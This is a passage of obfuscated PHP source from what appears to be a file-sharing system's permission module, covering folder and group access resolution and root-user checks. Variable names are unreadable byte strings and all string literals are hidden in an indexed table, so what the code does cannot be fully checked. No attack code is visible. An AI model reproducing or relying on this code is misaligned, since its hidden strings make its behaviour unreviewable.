($”¯ÆµÑ÷[$èÜ²®ºû[2154]] as $ÜÍÂÂÄğ) { $ÙŞšŠğ = Model($èÜ²®ºû[585])->getInfo($ÜÍÂÂÄğ[$èÜ²®ºû[1962]]); $©ÆË¾Á = Model($èÜ²®ºû[598])->getInfoSimpleOuter($£¥úÃºğ); $©ÆË¾Á[$èÜ²®ºû[540]] = $ÜÍÂÂÄğ[$èÜ²®ºû[487]]; if (Model($èÜ²®ºû[571])->authCheckAction($ÜÍÂÂÄğ[$èÜ²®ºû[487]][$èÜ²®ºû[487]], $èÜ²®ºû[1983])) { continue; } $Ğû›ˆáÒ = array($èÜ²®ºû[32] => $èÜ²®ºû[1286] . $ÙŞšŠğ[$èÜ²®ºû[32]], $èÜ²®ºû[193] => $ÙŞšŠğ[$èÜ²®ºû[90]][$èÜ²®ºû[193]], $èÜ²®ºû[87] => KodIO::make($ÙŞšŠğ[$èÜ²®ºû[90]][$èÜ²®ºû[193]]), $èÜ²®ºû[192] => $èÜ²®ºû[228], $èÜ²®ºû[190] => $èÜ²®ºû[578], $èÜ²®ºû[33] => $èÜ²®ºû[616], $èÜ²®ºû[582] => $ÙŞšŠğ[$èÜ²®ºû[589]], $èÜ²®ºû[1962] => $ÙŞšŠğ[$èÜ²®ºû[1962]], $èÜ²®ºû[586] => $ÙŞšŠğ[$èÜ²®ºû[192]], $èÜ²®ºû[2151] => array($©ÆË¾Á)); $¬ÉÊæ½ú[$Ğû›ˆáÒ[$èÜ²®ºû[193]]] = $Ğû›ˆáÒ; } } $¯ŸªæÆú = array(); $ÇÄÖ£Â× = $this->getAllChildren($ŞñğíÅÍ); foreach ($ÇÄÖ£Â× as $Í¿ç®ÖÀ) { $‡áõş‡¥ = !1; foreach ($Í¿ç®ÖÀ[$èÜ²®ºû[2151]] as $Œé¢¥©–) { if ($Œé¢¥©–[$èÜ²®ºû[1763]]) { if ($Œé¢¥©–[$èÜ²®ºû[1763]] == $£¥úÃºğ) { $‡áõş‡¥ = !0; break; } } if ($Œé¢¥©–[$èÜ²®ºû[1962]]) { if ($this->groupContainUser($Œé¢¥©–[$èÜ²®ºû[1962]], $£¥úÃºğ)) { $‡áõş‡¥ = !0; break; } } } if ($‡áõş‡¥) { $¯ŸªæÆú[] = $Í¿ç®ÖÀ; } $Š¶Œ‡›Ô = $Í¿ç®ÖÀ[$èÜ²®ºû[193]]; if (isset($¬ÉÊæ½ú[$Š¶Œ‡›Ô])) { $Í¿ç®ÖÀ[$èÜ²®ºû[2151]][] = $¬ÉÊæ½ú[$Š¶Œ‡›Ô][0]; $¬ÉÊæ½ú[$Š¶Œ‡›Ô] = !1; } } $¬ÉÊæ½ú = array_filter(array_values($¬ÉÊæ½ú)); $¯ŸªæÆú = array_merge($¬ÉÊæ½ú, $¯ŸªæÆú); return $¯ŸªæÆú; } public function setAllChildrenByUser($³´÷âšÈ, $¶¥¼–ÖÈ, $–Ä—Ù•») { $­Š¾Û‘ =& $_SERVER[ˆ¡¹µ‹Â]; $ÃÉ¹Ñ…¡ = $this->getAllChildrenByUser($³´÷âšÈ, $¶¥¼–ÖÈ); if (!$–Ä—Ù•» || !$ÃÉ¹Ñ…¡) { return !1; } foreach ($ÃÉ¹Ñ…¡ as $ĞÊò£Æ ) { $Óä˜Ûø = array(); foreach ($ĞÊò£Æ [$­Š¾Û‘[2151]] as $ˆ„µ¶„ö) { $ÃÒşã¿ß = $ˆ„µ¶„ö[$­Š¾Û‘[540]]; $”Æ¶õî¹ = $ˆ„µ¶„ö[$­Š¾Û‘[1763]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ôş¢°ğ¹ = $ˆ„µ¶„ö[$­Š¾Û‘[1763]] ? $ˆ„µ¶„ö[$­Š¾Û‘[1763]] : $ˆ„µ¶„ö[$­Š¾Û‘[1962]]; if ($ˆ„µ¶„ö[$­Š¾Û‘[1763]] && $ˆ„µ¶„ö[$­Š¾Û‘[1763]] == $¶¥¼–ÖÈ) { continue; } $Óä˜Ûø[] = array($­Š¾Û‘[193] => $ĞÊò£Æ [$­Š¾Û‘[193]], $­Š¾Û‘[190] => $”Æ¶õî¹, $­Š¾Û‘[569] => intval($ôş¢°ğ¹), $­Š¾Û‘[2070] => isset($ÃÒşã¿ß[$­Š¾Û‘[475]]) ? intval($ÃÒşã¿ß[$­Š¾Û‘[475]]) : 0, $­Š¾Û‘[2131] => isset($ÃÒşã¿ß[$­Š¾Û‘[2131]]) ? intval($ÃÒşã¿ß[$­Š¾Û‘[2131]]) : -1); } $Óä˜Ûø[] = array($­Š¾Û‘[193] => $ĞÊò£Æ [$­Š¾Û‘[193]], $­Š¾Û‘[190] => SourceModel::TYPE_USER, $­Š¾Û‘[569] => intval($¶¥¼–ÖÈ), $­Š¾Û‘[2070] => intval($–Ä—Ù•»), $­Š¾Û‘[2131] => -1); $this->where(array($­Š¾Û‘[491] => $ĞÊò£Æ [$­Š¾Û‘[193]]))->delete(); $this->addAll($Óä˜Ûø); } return !0; } public function get($º®è·¥) { $•µ®İÀ = $this->getSourceList(array($º®è·¥), !0); return $•µ®İÀ[0]; } public function getSourceList($¼§ñøÈ, $ªªÍÆÑİ = false, $şÖÈçÂ« = false) { $Æœ¼êŠù =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¼§ñøÈ) { return array(); } $‚“¾ÒÃ‡ = Model($Æœ¼êŠù[1411]); if (!$ªªÍÆÑİ && count($¼§ñøÈ) == 1) { $ªªÍÆÑİ = array(); $ªªÍÆÑİ[$¼§ñøÈ[0]] = $‚“¾ÒÃ‡->sourceInfo($¼§ñøÈ[0]); } if (!$ªªÍÆÑİ) { $‡ÆÈì†¸ = array($Æœ¼êŠù[491] => array($Æœ¼êŠù[492], $¼§ñøÈ)); $ªªÍÆÑİ = $‚“¾ÒÃ‡->field($Æœ¼êŠù[2155])->where($‡ÆÈì†¸)->select(); $ªªÍÆÑİ = array_to_keyvalue($ªªÍÆÑİ, $Æœ¼êŠù[193]); } $öº‘‡„‹ = $¼§ñøÈ; foreach ($ªªÍÆÑİ as $„€½ÌÛ® => $ÌÙ²›“) { $Ê°şÏÆ = $‚“¾ÒÃ‡->parentLevelArray($ÌÙ²›“[$Æœ¼êŠù[584]]); $öº‘‡„‹ = array_merge($öº‘‡„‹, array($„€½ÌÛ®), array_reverse($Ê°şÏÆ)); } $öº‘‡„‹ = array_values(array_unique($öº‘‡„‹)); if (!$öº‘‡„‹) { return array(); } $Òû¼–ÕÅ = $this->sourceAuthSelect($öº‘‡„‹); $¶ú©©¬  = array(); foreach ($öº‘‡„‹ as $ğÌ®¸ö) { if (isset($Òû¼–ÕÅ[$ğÌ®¸ö])) { $¶ú©©¬ [$ğÌ®¸ö] = $Òû¼–ÕÅ[$ğÌ®¸ö]; } } $€Ê™Ùúª = $this->userIsRoot($şÖÈçÂ«); $´Ìò”é = AuthModel::authAll(); $İËØßŒ¯ = array($Æœ¼êŠù[488] => $´Ìò”é, $Æœ¼êŠù[2156] => array($Æœ¼êŠù[493] => 0, $Æœ¼êŠù[1968] => $´Ìò”é, $Æœ¼êŠù[494] => LNG($Æœ¼êŠù[2157]), $Æœ¼êŠù[1985] => $Æœ¼êŠù[2158])); $èëÙ•Ê¹ = array(); foreach ($ªªÍÆÑİ as $ğÌ®¸ö => $ãı¸Ççì) { if ($€Ê™Ùúª && $GLOBALS[$Æœ¼êŠù[6]][$Æœ¼êŠù[1981]]) { $èëÙ•Ê¹[$ğÌ®¸ö] = $İËØßŒ¯; continue; } $èëÙ•Ê¹[$ğÌ®¸ö] = $this->makeSourceAuth($ãı¸Ççì, $¶ú©©¬ , $şÖÈçÂ«); } return $èëÙ•Ê¹; } public function authDeepCheck($¹¹é¥ü…, $¡¸õİ = false) { $‚ìÛÊ =& $_SERVER[ˆ¡¹µ‹Â]; $¡¸õİ = $¡¸õİ ? $¡¸õİ : USER_ID; $ğ¯‹ÂÍ÷ = $this->makeAuthDeep($¡¸õİ); if (!in_array($¹¹é¥ü…, $ğ¯‹ÂÍ÷[$‚ìÛÊ[2159]])) { return !1; } $àï»¶Ÿ‘ = array(); foreach ($ğ¯‹ÂÍ÷[$‚ìÛÊ[2160]] as $êƒƒ»Ï° => $×†È½¤) { if (!in_array($¹¹é¥ü…, $×†È½¤)) { continue; } $àï»¶Ÿ‘[] = $êƒƒ»Ï°; } if (!$àï»¶Ÿ‘) { return !1; } $åÑáì‹ = $àï»¶Ÿ‘ ? $àï»¶Ÿ‘[0] : $¹¹é¥ü…; return array($‚ìÛÊ[488] => -1, $‚ìÛÊ[540] => array($‚ìÛÊ[493] => $‚ìÛÊ[1266], $‚ìÛÊ[1968] => $‚ìÛÊ[228], $‚ìÛÊ[494] => LNG($‚ìÛÊ[2161]), $‚ìÛÊ[1985] => $‚ìÛÊ[2162]), $‚ìÛÊ[2163] => LNG($‚ìÛÊ[2164]), $‚ìÛÊ[2165] => $this->sourceAuthInfo($åÑáì‹)); } protected function makeAuthDeep($¨õàäÚˆ = false) { $Ãéç¤Ã¾ =& $_SERVER[ˆ¡¹µ‹Â]; static $ìƒÏ–µÎ = array(); $¨õàäÚˆ = $¨õàäÚˆ ? $¨õàäÚˆ : USER_ID; if (isset($ìƒÏ–µÎ[$¨õàäÚˆ])) { return $ìƒÏ–µÎ[$¨õàäÚˆ]; } $ÃÛÓ÷½ë = Model($Ãéç¤Ã¾[2166])->listData(); $ûçàç½® = array(); foreach ($ÃÛÓ÷½ë as $ßõ¦ëÑ›) { if ($ßõ¦ëÑ›[$Ãéç¤Ã¾[487]] == 0 && $ßõ¦ëÑ›[$Ãéç¤Ã¾[1984]] == $Ãéç¤Ã¾[91]) { $ûçàç½®[] = $ßõ¦ëÑ›[$Ãéç¤Ã¾[475]]; } } $ğşã«Â” = $this->userGroupParents($¨õàäÚˆ); $†¾çá§õ = array($Ãéç¤Ã¾[190] => SourceModel::TYPE_USER, $Ãéç¤Ã¾[569] => $¨õàäÚˆ); if ($ğşã«Â”) { $†¾çá§õ = array(array($Ãéç¤Ã¾[190] => SourceModel::TYPE_USER, $Ãéç¤Ã¾[569] => $¨õàäÚˆ), array($Ãéç¤Ã¾[190] => SourceModel::TYPE_GROUP, $Ãéç¤Ã¾[569] => array($Ãéç¤Ã¾[492], $ğşã«Â”)), $Ãéç¤Ã¾[1071] => $Ãéç¤Ã¾[2064]); } $’·¥è’Ş = $this->field($Ãéç¤Ã¾[2167])->where($†¾çá§õ)->select(); $à™İ“·Ñ = array(); $¿íÕˆ¹ = array_to_keyvalue_group($’·¥è’Ş, $Ãéç¤Ã¾[193]); foreach ($¿íÕˆ¹ as $ì¹Ô Ş– => $‹È¶¼§­) { $·Â£Ø  = $this->authArrayCheck($‹È¶¼§­, $¨õàäÚˆ); if ($·Â£Ø [$Ãéç¤Ã¾[488]] > 0) { $à™İ“·Ñ[] = $ì¹Ô Ş– . $Ãéç¤Ã¾[12]; } } if ($ğşã«Â”) { $Š¹ŸåŞ = Model($Ãéç¤Ã¾[585]); foreach ($ğşã«Â” as $ï¥ñÒ) { $âü¼å‚˜ = $Š¹ŸåŞ->getInfo($ï¥ñÒ); if (!$âü¼å‚˜ || !is_array($âü¼å‚˜[$Ãéç¤Ã¾[90]])) { continue; } $à™İ“·Ñ[] = $âü¼å‚˜[$Ãéç¤Ã¾[90]][$Ãéç¤Ã¾[193]]; } } $ÊÏÑÛÂ¥ = array(); $¸­Ûîü = $ğşã«Â”; $ãë¾£Ù = Model($Ãéç¤Ã¾[1411]); $Š¹ŸåŞ = Model($Ãéç¤Ã¾[585]); $›ëè›âÜ = array(); $‹àøÖÍŸ = array(); $˜ÅÈáæ = array(); $Ä¦Ÿ–ßù = array(); if ($à™İ“·Ñ) { $ÎÔ ÀÓ = $ãë¾£Ù->where(array($Ãéç¤Ã¾[193] => array($Ãéç¤Ã¾[492], $à™İ“·Ñ)))->select(); foreach ($ÎÔ ÀÓ as $«„ãÄ™Ï) { $ı…Û¤«¿ = $ãë¾£Ù->parentLevelArray($«„ãÄ™Ï[$Ãéç¤Ã¾[584]]); $ÊÏÑÛÂ¥ = array_merge($ÊÏÑÛÂ¥, $ı…Û¤«¿); $¸­Ûîü[] = $«„ãÄ™Ï[$Ãéç¤Ã¾[569]]; $›ëè›âÜ[$«„ãÄ™Ï[$Ãéç¤Ã¾[193]]] = $ı…Û¤«¿; $‹àøÖÍŸ[$«„ãÄ™Ï[$Ãéç¤Ã¾[193]]] = $«„ãÄ™Ï[$Ãéç¤Ã¾[569]]; } } $¸­Ûîü = array_values(array_unique($¸­Ûîü)); $·×¬ù°ª = $¸­Ûîü; foreach ($·×¬ù°ª as $ï¥ñÒ) { $âü¼å‚˜ = $Š¹ŸåŞ->getInfo($ï¥ñÒ); $ı…Û¤«¿ = $ãë¾£Ù->parentLevelArray($âü¼å‚˜[$Ãéç¤Ã¾[584]]); $¸­Ûîü = array_merge($¸­Ûîü, $ı…Û¤«¿); } $¸­Ûîü = array_values(array_unique($¸­Ûîü)); foreach ($¸­Ûîü as $ï¥ñÒ) { $âü¼å‚˜ = $Š¹ŸåŞ->getInfo($ï¥ñÒ); $ÊÏÑÛÂ¥[] = $âü¼å‚˜[$Ãéç¤Ã¾[90]][$Ãéç¤Ã¾[193]]; $˜ÅÈáæ[$ï¥ñÒ] = $âü¼å‚˜[$Ãéç¤Ã¾[90]][$Ãéç¤Ã¾[193]]; $Ä¦Ÿ–ßù[$ï¥ñÒ] = $ãë¾£Ù->parentLevelArray($âü¼å‚˜[$Ãéç¤Ã¾[584]]); } foreach ($›ëè›âÜ as $ˆÊÜ»ªĞ => $Ÿ‚…‘) { $±Õ‡ù¸é = $‹àøÖÍŸ[$ˆÊÜ»ªĞ]; if (!$±Õ‡ù¸é || !$˜ÅÈáæ[$±Õ‡ù¸é]) { continue; } $³…ì¹ªø = array(); foreach ($Ä¦Ÿ–ßù[$±Õ‡ù¸é] as $ï¥ñÒ) { $³…ì¹ªø[] = $˜ÅÈáæ[$ï¥ñÒ]; } $›ëè›âÜ[$ˆÊÜ»ªĞ] = array_merge($³…ì¹ªø, $Ÿ‚…‘); } $ÊÏÑÛÂ¥ = array_values(array_unique($ÊÏÑÛÂ¥)); $´®Ü…éî = array($Ãéç¤Ã¾[2159] => $ÊÏÑÛÂ¥, $Ãéç¤Ã¾[2160] => $›ëè›âÜ); $ìƒÏ–µÎ[$¨õàäÚˆ] = $´®Ü…éî; return $´®Ü…éî; } private function makeSourceAuth($ß¥ˆòç, $ïÃİ„óæ, $­°·î = false) { $×¸¿Õ­ =& $_SERVER[ˆ¡¹µ‹Â]; $ÒÍ Ş”” = $×¸¿Õ­[91]; $İ“½à = $ß¥ˆòç[$×¸¿Õ­[569]]; $¥Ãšˆæ„ = $ß¥ˆòç[$×¸¿Õ­[190]] == SourceModel::TYPE_GROUP; $û’ÅÂÀ¡ = $¥Ãšˆæ„ ? $this->groupRootAuth($İ“½à, $­°·î) : !1; if ($û’ÅÂÀ¡ && Model($×¸¿Õ­[571])->authCheckAction($û’ÅÂÀ¡[$×¸¿Õ­[487]], $×¸¿Õ­[1983])) { return $this->groupAuthInfo($û’ÅÂÀ¡, $İ“½à); } $ßŸşÇæ˜ = Model($×¸¿Õ­[1411])->parentLevelArray($ß¥ˆòç[$×¸¿Õ­[584]]); $ßŸşÇæ˜ = array_merge(array($ß¥ˆòç[$×¸¿Õ­[193]]), array_reverse($ßŸşÇæ˜)); $ÅúÂ÷‹ˆ = !1; foreach ($ßŸşÇæ˜ as $¦‰¬ƒ ) { if (!isset($ïÃİ„óæ[$¦‰¬ƒ ])) { continue; } $’é„å´¢ = $this->authMake($ïÃİ„óæ[$¦‰¬ƒ ], $­°·î); if ($’é„å´¢[$×¸¿Õ­[540]]) { $ÅúÂ÷‹ˆ = $’é„å´¢; break; } } if (!$¥Ãšˆæ„) { return $ÅúÂ÷‹ˆ; } if (!$ÅúÂ÷‹ˆ && $û’ÅÂÀ¡) { $ÅúÂ÷‹ˆ = $this->groupAuthInfo($û’ÅÂÀ¡, $İ“½à); } if (!$ÅúÂ÷‹ˆ) { $ì¥³»ÆÆ = Model($×¸¿Õ­[585])->getInfo($İ“½à); $”Û’Ñ—ó = explode($×¸¿Õ­[50], trim($ì¥³»ÆÆ[$×¸¿Õ­[584]], $×¸¿Õ­[50])); $”Û’Ñ—ó = array_reverse($”Û’Ñ—ó); foreach ($”Û’Ñ—ó as $‚Ïëç½Í) { if ($‚Ïëç½Í == $×¸¿Õ­[228] || $‚Ïëç½Í == $ÒÍ Ş””) { continue; } $—ğ‚ó¾ó = $this->groupRootAuth($‚Ïëç½Í, $­°·î); if (!$—ğ‚ó¾ó) { continue; } $ÅúÂ÷‹ˆ = $this->groupAuthInfo($—ğ‚ó¾ó, $‚Ïëç½Í); break; } } if (!$ÅúÂ÷‹ˆ || $ÅúÂ÷‹ˆ[$×¸¿Õ­[488]] <= 0) { $¬¿şÜìÉ = $this->authDeepCheck($ß¥ˆòç[$×¸¿Õ­[193]], $­°·î); if ($¬¿şÜìÉ) { $ÅúÂ÷‹ˆ = $¬¿şÜìÉ; } } return $ÅúÂ÷‹ˆ; } private function userIsRoot($ ›çÇ® = false) { $ ªÄˆïæ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ ›çÇ® && KodUser::isRoot()) { return !0; } $·Ú¦³”” = Model($ ªÄˆïæ[598])->getInfo($ ›çÇ®); $İÛ”Ãû = Model($ ªÄˆïæ[2168])->listData($·Ú¦³””[$ ªÄˆïæ[2169]]); if ($İÛ”Ãû && $İÛ”Ãû[$ ªÄˆïæ[575]][$ ªÄˆïæ[2170]] == 1) { return !0; } return !1; } private function sourceAuthInfo($º“ûá‰) { $Ÿ‰İÓõ =& $_SERVER[ˆ¡¹µ‹Â]; $ç°”×ñ = Model($Ÿ‰İÓõ[1411]); $®˜œ»â = $ç°”×ñ->sourceInfo($º“ûá‰); if (!$®˜œ»â) { return !1; } $ç°”×ñ->groupPathDisplay($®˜œ»â); $¬”ÙŞ¥Õ = array($®˜œ»â); $¬”ÙŞ¥Õ = $ç°”×ñ->_listAppendPath($¬”ÙŞ¥Õ); $®˜œ»â = $¬”ÙŞ¥Õ[0]; $Ùí÷ş = $®˜œ»â[$Ÿ‰İÓõ[582]]; if (isset($®˜œ»â[$Ÿ‰İÓõ[590]])) { $ã÷´½ = explode($Ÿ‰İÓõ[8], trim($®˜œ»â[$Ÿ‰İÓõ[582]], $Ÿ‰İÓõ[8])); array_shift($ã÷´½); $Ùí÷ş = $®˜œ»â[$Ÿ‰İÓõ[588]] . $Ÿ‰İÓõ[2171] . implode($Ÿ‰İÓõ[8], $ã÷´½); } return array($Ÿ‰İÓõ[494] => $®˜œ»â[$Ÿ‰İÓõ[32]], $Ÿ‰İÓõ[87] => KodIO::make($®˜œ»â[$Ÿ‰İÓõ[193]]), $Ÿ‰İÓõ[2172] => $Ùí÷ş); } private function groupAuthInfo($èÅà»¸, $¤ûşëƒ) { $ÎêÓØèö =& $_SERVER[ˆ¡¹µ‹Â]; $¾ãñ¸Îë = Model($ÎêÓØèö[585])->getInfo($¤ûşëƒ); return array($ÎêÓØèö[2173] => intval($èÅà»¸[$ÎêÓØèö[487]]), $ÎêÓØèö[2156] => $èÅà»¸, $ÎêÓØèö[2174] => LNG($ÎêÓØèö[2175]), $ÎêÓØèö[2165] => array($ÎêÓØèö[494] => $¾ãñ¸Îë[$ÎêÓØèö[32]], $ÎêÓØèö[87] => KodIO::make($¾ãñ¸Îë[$ÎêÓØèö[90]][$ÎêÓØèö[193]]), $ÎêÓØèö[2172] => $¾ãñ¸Îë[$ÎêÓØèö[589]])); } protected function groupRootAuth($¿ó½ù•, $çª«Ìò = false) { $ŞÇ÷Çéé =& $_SERVER[ˆ¡¹µ‹Â]; $çª«Ìò = $çª«Ìò ? $çª«Ìò : USER_ID; $£ıæãéÜ = $çª«Ìò . $ŞÇ÷Çéé[2176] . $¿ó½ù•; static $”ù¡Á³É = array(); if (isset($”ù¡Á³É[$£ıæãéÜ])) { return $”ù¡Á³É[$£ıæãéÜ]; } $ÔòÁããß = Model($ŞÇ÷Çéé[585])->getInfo($¿ó½ù•); $ÉùË¤êë = $this->userGroupList($çª«Ìò); $ÈÖ©÷î— = isset($ÉùË¤êë[$¿ó½ù•]) ? $ÉùË¤êë[$¿ó½ù•][$ŞÇ÷Çéé[487]] : !1; if ($ÈÖ©÷î— && Model($ŞÇ÷Çéé[571])->authCheckAction($ÈÖ©÷î—[$ŞÇ÷Çéé[487]], $ŞÇ÷Çéé[1983])) { $”ù¡Á³É[$£ıæãéÜ] = $ÈÖ©÷î—; return $ÈÖ©÷î—; } $ÌŠ›™ºó = $this->sourceAuthSelect($ÔòÁããß[$ŞÇ÷Çéé[90]][$ŞÇ÷Çéé[193]]); $»™¥³ó® = $ÌŠ›™ºó ? $this->authMake($ÌŠ›™ºó, $çª«Ìò) : !1; $Ø›·ğÎü = $»™¥³ó® ? $»™¥³ó®[$ŞÇ÷Çéé[540]] : !1; $”ù¡Á³É[$£ıæãéÜ] = $Ø›·ğÎü ? $Ø›·ğÎü : $ÈÖ©÷î—; return $”ù¡Á³É[$£ıæãéÜ]; } public function authOwnerApply($êÅôÌ­å) { $‰Ó²¯åœ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($êÅôÌ­å[$‰Ó²¯åœ[487]]) || isset($êÅôÌ­å[$‰Ó²¯åœ[2177]]) && $êÅôÌ­å[$‰Ó²¯åœ[2177]]) { return $êÅôÌ­å; } if (AuthModel::authCheckRoot($êÅôÌ­å[$‰Ó²¯åœ[487]][$‰Ó²¯åœ[488]])) { return $êÅôÌ­å; } $òüş‘‹ = Model($‰Ó²¯åœ[1411])->parentLevelArray($êÅôÌ­å[$‰Ó²¯åœ[584]]); $òüş‘‹ = array_merge(array($êÅôÌ­å[$‰Ó²¯åœ[193]]), array_reverse($òüş‘‹)); $Şˆ„çØ = $this->sourceAuthSelect($òüş‘‹); $‹ÁÕºÊš = array(); $Äºş£¬è = array(); foreach ($Şˆ„çØ as $à×ÀØœ£ => $ÎÑç¢‡) { $Œ¡±¦¨ê = $this->authFolderOwnerUser($ÎÑç¢‡); $‹ÁÕºÊš[$à×ÀØœ£] = $Œ¡±¦¨ê; $Äºş£¬è = array_merge($Äºş£¬è, $Œ¡±¦¨ê[$‰Ó²¯åœ[662]]); if ($Œ¡±¦¨ê[$‰Ó²¯åœ[2178]]) { break; } } if (count($Äºş£¬è) == 0) { $Äºş£¬è = $this->authFolderOwnerGroup($êÅôÌ­å[$‰Ó²¯åœ[569]]); } $Äºş£¬è = array_unique($Äºş£¬è); if (AuthModel::authCheckRoot($êÅôÌ­å[$‰Ó²¯åœ[487]][$‰Ó²¯åœ[488]])) { $Äºş£¬è[] = USER_ID; } $êÅôÌ­å[$‰Ó²¯åœ[487]][$‰Ó²¯åœ[2179]] = Model($‰Ó²¯åœ[577])->userListInfo($Äºş£¬è); return $êÅôÌ­å; } private function authFolderOwnerGroup($Õ¸Âàûå) { $¤³¨¨Ÿ´ =& $_SERVER[ˆ¡¹µ‹Â]; $íìƒºğ = Model($¤³¨¨Ÿ´[2056])->where(array($¤³¨¨Ÿ´[1962] => $Õ¸Âàûå))->select(); $Ğ›£öõî = array(); if (!$íìƒºğ) { return $Ğ›£öõî; } foreach ($íìƒºğ as $âÂï¯Øò) { $íÆÀ×Àç = $this->authInfo($âÂï¯Øò); if (AuthModel::authCheckRoot($íÆÀ×Àç[$¤³¨¨Ÿ´[487]])) { $Ğ›£öõî[] = $âÂï¯Øò[$¤³¨¨Ÿ´[1763]]; } } return $Ğ›£öõî; } private function authFolderOwnerUser($òıä™ä) { $ÏìãûÄ =& $_SERVER[ˆ¡¹µ‹Â]; $É©„ºôƒ = array(); $ÌäÎË’ = !1; foreach ($òıä™ä as $Ó¶øÒÎ) { $£´²•õ¸ = $this->authInfo($Ó¶øÒÎ); if ($Ó¶øÒÎ[$ÏìãûÄ[569]] == $ÏìãûÄ[228]) { $ÌäÎË’ = !0; } if ($Ó¶øÒÎ[$ÏìãûÄ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($£´²•õ¸[$ÏìãûÄ[487]])) { $É©„ºôƒ[] = $Ó¶øÒÎ[$ÏìãûÄ[569]]; } } } return array($ÏìãûÄ[662] => $É©„ºôƒ, $ÏìãûÄ[2178] => $ÌäÎË’); } public function authMake($ò©Ê­ˆÇ, $ã¯ÑÂÛŸ = false) { $²´Õ´‚¬ =& $_SERVER[ˆ¡¹µ‹Â]; $Ú›®¸ÂÇ = $this->authArrayCheck($ò©Ê­ˆÇ, $ã¯ÑÂÛŸ); if ($Ú›®¸ÂÇ[$²´Õ´‚¬[2180]]) { $Ú›®¸ÂÇ[$²´Õ´‚¬[2180]] = $this->sourceAuthInfo($Ú›®¸ÂÇ[$²´Õ´‚¬[2180]]); } return $Ú›®¸ÂÇ; } public function authArrayCheck($É¤‘Í¤, $Ø–é¹½í = false) { $ñé¢ÇÀ² =& $_SERVER[ˆ¡¹µ‹Â]; if (!$É¤‘Í¤) { return array($ñé¢ÇÀ²[488] => 0, $ñé¢ÇÀ²[540] => !1); } $Ø–é¹½í = $Ø–é¹½í ? $Ø–é¹½í : USER_ID; $‹Üäì¶ì = 0; $Æ¯¿šß = 0; $à‡ÕğÛú = 0; $¡ÔÕ˜“Ù = 0; $Êí¨¯• = 0; $†Ğßê‡æ = 0; $§µ µ±” = 1000; $‡·îÇ¾ = 0; $ø¬³ßôŸ = 0; $¨îëÇé¥ = 0; $Òïøªô× = 0; $é¥ÇÛÚƒ = array($ñé¢ÇÀ²[193] => 0); foreach ($É¤‘Í¤ as $é¥ÇÛÚƒ) { $ëó†éÈ = $this->authInfo($é¥ÇÛÚƒ); if (!$ëó†éÈ) { continue; } $îüñÇ² = $é¥ÇÛÚƒ[$ñé¢ÇÀ²[569]]; $Õã…õ’‚ = intval($ëó†éÈ[$ñé¢ÇÀ²[487]]); if ($é¥ÇÛÚƒ[$ñé¢ÇÀ²[190]] == SourceModel::TYPE_USER && $îüñÇ² == $Ø–é¹½í) { $‹Üäì¶ì = !0; $à‡ÕğÛú = $ëó†éÈ; $Æ¯¿šß = $Õã…õ’‚; } else { if ($é¥ÇÛÚƒ[$ñé¢ÇÀ²[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($îüñÇ², $Ø–é¹½í)) { $¡ÔÕ˜“Ù = !0; $Š‡á›ß’ = $this->groupStepToUserGroup($îüñÇ², $Ø–é¹½í); if ($Š‡á›ß’ < $§µ µ±”) { $§µ µ±” = $Š‡á›ß’; $Êí¨¯• = $Õã…õ’‚; $†Ğßê‡æ = $ëó†éÈ; $‡·îÇ¾ = $îüñÇ²; } if ($Š‡á›ß’ == $§µ µ±” && $Õã…õ’‚ >= $Êí¨¯•) { $Êí¨¯• = $Õã…õ’‚; $†Ğßê‡æ = $ëó†éÈ; $‡·îÇ¾ = $îüñÇ²; } } else { if ($îüñÇ² == $ñé¢ÇÀ²[228]) { $ø¬³ßôŸ = !0; $Òïøªô× = $ëó†éÈ; $¨îëÇé¥ = $Õã…õ’‚; } } } } if ($‹Üäì¶ì) { $¿€¥¶ªö = $Æ¯¿šß; $ëó†éÈ = $à‡ÕğÛú; $úÑ«åÕ‰ = LNG($ñé¢ÇÀ²[2181]); } else { if ($¡ÔÕ˜“Ù) { $¿€¥¶ªö = $Êí¨¯•; $ëó†éÈ = $†Ğßê‡æ; $¡ÊÏ¤¿ç = Model($ñé¢ÇÀ²[585])->getInfo($‡·îÇ¾); $úÑ«åÕ‰ = $ñé¢ÇÀ²[176] . $¡ÊÏ¤¿ç[$ñé¢ÇÀ²[589]] . $ñé¢ÇÀ²[2182] . LNG($ñé¢ÇÀ²[2183]); } else { if ($ø¬³ßôŸ) { $¿€¥¶ªö = $¨îëÇé¥; $ëó†éÈ = $Òïøªô×; $úÑ«åÕ‰ = LNG($ñé¢ÇÀ²[2153]); } else { $¿€¥¶ªö = 0; $ëó†éÈ = !1; $úÑ«åÕ‰ = $ñé¢ÇÀ²[12]; } } } $ûƒë”­ß = array($ñé¢ÇÀ²[2173] => intval($¿€¥¶ªö), $ñé¢ÇÀ²[2156] => $ëó†éÈ, $ñé¢ÇÀ²[2174] => $úÑ«åÕ‰, $ñé¢ÇÀ²[2165] => $é¥ÇÛÚƒ[$ñé¢ÇÀ²[193]]); return $ûƒë”­ß; } private function groupContainUser($ĞÕÜıä§, $Ğ‡¤­ıÍ = false) { return in_array($ĞÕÜıä§, $this->userGroupParents($Ğ‡¤­ıÍ)); } private function groupStepToUserGroup($ûÍ­°åÏ, $¦¡¦÷Áà = false) { $şÔÁ¹ =& $_SERVER[ˆ¡¹µ‹Â]; $ù‰ÙŸ¯Å = $this->userGroupList($¦¡¦÷Áà); $¬Íö¿Ù = 1000; $áÊ±ÖÕ = $GLOBALS[$şÔÁ¹[6]][$şÔÁ¹[92]][$şÔÁ¹[2069]] == 1; $•óéñ” = $áÊ±ÖÕ ? 3 : 2; foreach ($ù‰ÙŸ¯Å as $»Ì³îêş) { if ($»Ì³îêş[$şÔÁ¹[1962]] == $ûÍ­°åÏ) { return 0; } $ÁåÈæš = explode($şÔÁ¹[50], trim($»Ì³îêş[$şÔÁ¹[584]], $şÔÁ¹[50])); if ($ÁåÈæš[0] == $şÔÁ¹[228] && count($ÁåÈæš) > $•óéñ”) { $ÉÖ¸È­ˆ = array_reverse(array_slice($ÁåÈæš, $•óéñ”)); $£ûËÏ€Ê = array_search($ûÍ­°åÏ, $ÉÖ¸È­ˆ); if ($£ûËÏ€Ê !== !1 && $£ûËÏ€Ê + 1 <= $¬Íö¿Ù) { $¬Íö¿Ù = $£ûËÏ€Ê + 1; } } } return 